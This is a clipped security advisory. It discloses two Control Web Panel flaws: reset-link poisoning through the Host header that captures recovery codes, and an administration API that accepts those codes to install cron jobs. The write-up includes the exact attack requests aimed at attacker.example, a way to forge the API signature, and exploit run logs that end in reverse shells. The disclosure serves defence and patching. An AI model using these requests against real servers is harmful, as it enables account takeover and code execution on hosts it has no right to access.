---
title: One Recovery Code, Two Shells in Control Web Panel
source: https://www.vulncheck.com/blog/control-web-panel-recovery-code-rce
source_host: www.vulncheck.com
clip_date: 2026-11-19T09:36:57+08:00
trace_id: 7f731cfa-8d10-4a6d-bb78-fee4c130884f
content_hash: 400f7f8206cab62db3e7983090c7fdcfd0c2eb94dc39c580d7a2f4897611cb81
status: synced
tags: []
series: null
feed_source: VulnCheck·漏洞研究
ai_summary: null
ai_summary_style: null
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 41d75244-d011-810f-a6ba-f8414a54c99f
ioc:
  cves:
    - CVE-2026-124020
    - CVE-2026-124021
  cwes: []
  hashes: []
  domains: []
  tools: []
  techniques: []
---

Today VulnCheck is disclosing two vulnerabilities in [Control Web Panel](https://control-webpanel.com/) (CWP, formerly CentOS Web Panel), the hosting control panel that runs on a large number of internet-facing servers. They are being disclosed in accordance with VulnCheck's [coordinated vulnerability disclosure policy](https://vulncheck.com/vulnerability-disclosure-policy), and both carry allocated IDs through the VulnCheck CNA:

-   [CVE-2026-124020](https://console.vulncheck.com/cve/CVE-2026-124020): the account password-reset link is built from the unauthenticated request `Host` header, so an attacker redirects the reset link to a listener it controls and captures the recovery code, then resets the password and reaches code execution as the hosting account.
-   [CVE-2026-124021](https://console.vulncheck.com/cve/CVE-2026-124021): the port 2304 administration API accepts a password-recovery code as OAuth authorization, so the same captured code adds a cron for the hosting account without ever resetting the password.

Both end in a shell as the hosting account, and both turn on one primitive: the password-recovery code CWP stores in its `oauth_authorization_codes` table. A hosting account is one customer's area on a shared CWP server, with its own home directory and shell user. CVE-2026-124020 steals a recovery code and spends it the way it was meant to be spent, on a password reset. CVE-2026-124021 is the more interesting of the two: it spends the same kind of code somewhere it was never meant to go, the administration API, which treats it as a valid API authorization. Control Web Panel 1.30.6 fixes both.

## The recovery code

When a user requests a password reset, CWP writes a single-use `authorization_code` into the `oauth_authorization_codes` table, keyed to the account, and emails a link that carries that code as an `idsession` parameter. The intended flow is simple: the user clicks the link, the code is checked, the password is changed, the code is spent. The two vulnerabilities below are two different ways to abuse that one row.

## CVE-2026-124020: the reset link points wherever the attacker says

The public login wrapper at `/login/index.php?acc=lostpass` takes a `username` and an `email` and, on a match, queues a reset mail. It is also an exact-pair oracle: a wrong username/email pair returns `0`, the exact pair returns `1`. The problem is how the reset link is built. The wrapper copies the unauthenticated `$_SERVER['HTTP_HOST']` into the fixed loopback request it makes to the internal reset route, and that route uses the caller-supplied host as the authority of the reset URL it emails. The link is sent to the real account owner, but it points at whatever host the attacker put in the `Host` header.

```md
POST /login/index.php?acc=lostpass HTTP/1.1
Host: attacker.example:8080
Content-Type: application/x-www-form-urlencoded

username=victim&email=victim%40example.com
```

The account owner, or an external mail-security scanner that follows links before delivery, opens the poisoned URL, and the live recovery code lands on the attacker's listener:

```md
GET /login/?acc=reconfir&idsession=<recovery-code> HTTP/1.1
Host: attacker.example:8080
```

With the code in hand, the attacker replays it to `/login/index.php?acc=newpass` to set a new password, logs in normally, and reaches code execution through two ordinary panel features: File Manager uploads a self-removing PHP file under the account's `tmp` directory, and the Crontab module schedules it to run once a minute with `/usr/local/bin/php`. The callback runs as the hosting account, not root. This path needs nothing but the account name and its contact email; it does not need the administration API, an API key, or the server hostname.

## CVE-2026-124021: the administration API takes a recovery code as authorization

CWP ships an optional remote administration API on port 2304. Its authorization routine, `validate()`, reads a caller-supplied `adds` array and looks the pair (`adds[user]`, `adds[token_id]`) up in the recovery-code table:

```sql
SELECT 1 FROM oauth_authorization_codes WHERE client_id = ? AND authorization_code = ? LIMIT 1
```

A live password-recovery row is enough to pass. The call is gated by a second field, `adds[session_id]`, and by a legacy daily signature:

```md
md5( shell_exec("hostname") + username + date("Y-m-d") + "softaculous" )
```

That looks like a secret, but every input is knowable. The `hostname` is the same value CWP presents as the CommonName of the port 2304 TLS certificate, so the attacker reads it straight off the certificate and reconstructs the signature; `"fantastico"` is accepted in place of `"softaculous"`. The configured API key is never the obstacle it appears to be either: a syntactically valid dummy top-level `key` passes, because the recovery-code branch returns before the code reaches the configured key file at `/root/.conf/apikey`.

With that authorization, the `POST /v1/cronjobsusers/` route adds an arbitrary cron for the account:

```md
POST /v1/cronjobsusers/ HTTP/1.1
Host: cwp.example:2304
Content-Type: application/x-www-form-urlencoded

key=<dummy>&action=add&user=victim&execute=* * * * *&command=<payload>&adds[session_id]=<any>&adds[user]=victim&adds[token_id]=<recovery-code>&adds[signature]=<md5>
```

The handler writes the line to `/home/victim/cron` and installs it with `crontab -u victim -`, so the command runs as the hosting account on the next minute. Standard CWP CSF excludes port 2304 from inbound access, so CVE-2026-124021 applies where the administration API has been deliberately exposed, which CWP's own documentation instructs for billing, provisioning, WHMCS, or migration use. Where it is reachable, a recovery code plus a signature read off the certificate is a full unauthenticated path to the account.

## Initial Access exploit

VulnCheck's Initial Access Intelligence team turned each bug into a self-contained [go-exploit](https://github.com/vulncheck-oss/go-exploit) module. CVE-2026-124020 poisons the reset link toward its own listener, captures the recovery code, resets the password, uploads the callback through File Manager, and schedules it:

```md
chocapikk@pwntoaster:~/feed/cve-2026-124020$ ./build/cve-2026-124020_linux-amd64 -s -rhost 192.168.1.72 -rport 2083 -v -c -e -account labtest -email lab@test.com -lhost 192.168.1.85 -lport 4444 -reset-http-port 8080
time=2026-11-11T14:59:11.173+01:00 level=STATUS msg="Reset-link listener on 192.168.1.85:8080; poisoning the link for labtest"
time=2026-11-11T14:59:11.410+01:00 level=SUCCESS msg="Lost-password message queued for labtest"
time=2026-11-11T14:59:12.431+01:00 level=SUCCESS msg="Captured reset token: 7719fe7c…"
time=2026-11-11T14:59:12.689+01:00 level=SUCCESS msg="Account password replaced for labtest"
time=2026-11-11T14:59:14.552+01:00 level=SUCCESS msg="Authenticated to the user panel as labtest (/cwp_f90336acbbbbf857/)"
time=2026-11-11T14:59:15.224+01:00 level=SUCCESS msg="Uploaded one-shot callback to /home/labtest/tmp/MkctpRbdne.php"
time=2026-11-11T14:59:16.573+01:00 level=SUCCESS msg="Scheduled the job once per minute for labtest"
time=2026-11-11T15:00:01.902+01:00 level=SUCCESS msg="Caught new shell from 192.168.1.72:53066"
id
uid=1001(labtest) gid=1001(labtest) groups=1001(labtest)
```

CVE-2026-124021 captures a recovery code the same way, reads the hostname from the 2304 certificate, builds the daily signature, and adds the cron through the administration API:

```md
chocapikk@pwntoaster:~/feed/cve-2026-124021$ ./build/cve-2026-124021_linux-amd64 -s -rhost 172.20.0.2 -rport 2304 -panel-port 2083 -e -account labtest -email lab@test.com -lhost 172.20.0.1 -lport 4467 -reset-http-port 18088
time=2026-11-13T07:50:55.759+01:00 level=STATUS msg="Using server hostname cwp1304.lab.test for the daily signature"
time=2026-11-13T07:50:57.994+01:00 level=SUCCESS msg="Captured recovery code: 5b057a96…"
time=2026-11-13T07:50:59.728+01:00 level=SUCCESS msg="Scheduled the cron for labtest (date 2026-11-13)"
time=2026-11-13T07:51:02.045+01:00 level=SUCCESS msg="Caught new shell from 172.20.0.2:33640"
time=2026-11-13T07:51:02.939+01:00 level=SUCCESS msg="Exploit successfully completed" exploited=true
id
uid=1001(labtest) gid=1001(labtest) groups=1001(labtest)
```

Every Monday, VulnCheck publishes a new exploit in the [Initial Access Community repository](https://github.com/vulncheck-oss/initial-access-community).

## Exposure

Control Web Panel is widely exposed. VulnCheck Target Intelligence, which fingerprints products from real scan data, confirms roughly 124,000 internet-facing CWP instances, close to the 126,000 that Shodan returns for the `cwpsrv` server banner. CVE-2026-124020 reaches that whole fleet: the lost-password endpoint is on the public user panel, which is what makes CWP reachable in the first place. CVE-2026-124021 is narrower by design, since CSF blocks port 2304 by default; it applies to the deliberately API-enabled subset, where the payoff is that a recovery code alone authorizes the administration API.

## The fix

Control Web Panel 1.30.6 addresses both. Reset links are built from the server's configured hostname instead of the request `Host` header, recovery codes are made single-use and consumed after a successful reset, and the administration API no longer accepts a recovery code in place of API authorization. Operators who cannot update immediately should keep port 2304 off the public internet and restrict the user panel to known networks.

## Timeline

| Date | Event |
| --- | --- |
| 2026-11-13 | The CVE-2026-124020 and CVE-2026-124021 records go live, both allocated through the VulnCheck CNA |
| 2026-11-16 | VulnCheck publishes this disclosure |

## Takeaway

A password-recovery code is a one-time secret with one job. Control Web Panel built a reset link that trusts the request `Host` header, which lets an attacker capture that code (CVE-2026-124020), and then wired the same code into the administration API as if it were an API credential (CVE-2026-124021). The lesson is the one that keeps recurring in control panels: a secret is only as scoped as the code paths that accept it, and a recovery code that any authorization routine will take is not a recovery code, it is a master key. Update to 1.30.6, and keep the administration API off the public internet.

## About VulnCheck

VulnCheck empowers organizations to transcend the challenges of vulnerability prioritization. Our suite of solutions provides product managers, PSIRT teams, and threat hunters with the tools required for accelerated, high-precision operations and infinite efficiency.

Recognizing the industry-wide necessity for superior data velocity and accuracy, we deliver high-fidelity insights to the market. We remain committed to surfacing critical intelligence on vulnerability exploitation and emerging trends, leveraging our unique dataset to support the practitioner community.

To deepen your understanding of these threats, [VulnCheck Exploit & Vulnerability Intelligence](https://vulncheck.com/product/exploit-intelligence) provides comprehensive coverage of global threat actors. Register for a demo to explore our intelligence today.
